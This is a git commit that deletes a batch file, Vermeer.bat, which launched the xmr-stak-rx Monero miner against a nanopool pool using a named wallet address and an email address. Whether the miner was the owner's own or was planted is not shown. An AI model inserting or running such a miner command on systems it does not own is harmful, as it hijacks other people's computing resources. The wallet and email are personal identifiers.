2bc2504f594d9d53a873ff108b195e1dc99bfa7f
Bobby Zahariev <121118069+borislavzahariev@users.noreply.github.com>
2022-12-20 15:38:12 -0500

    Delete Vermeer.bat

--- Vermeer.bat
+++
@@ -1,2 +0,0 @@
-xmr-stak-rx.exe -o xmr-us-east1.nanopool.org:14444 -u 46gnWLNg3p4LwF1Erxc69fHNo2ehwFKUF1bhky5pfWRKKQaBu2bnvADdozdJTNjpakR9dnKtK184tXrPstREeyrURj6daoj.Vermeer/prime6007@gmail.com -p x --use-nicehash --currency randomx
-
